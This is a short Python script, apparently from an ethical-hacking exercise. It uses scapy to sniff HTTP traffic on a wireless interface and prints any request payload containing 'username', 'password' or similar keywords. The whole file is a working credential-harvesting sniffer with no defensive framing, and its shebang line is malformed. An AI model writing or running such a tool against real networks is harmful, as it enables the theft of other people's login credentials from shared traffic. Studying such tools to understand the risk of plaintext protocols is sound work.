#!usr/bin/env/python

import scapy.all as scapy
from scapy.layers import http

def snif(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username" , "user", "uname" , "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


snif("wlan0")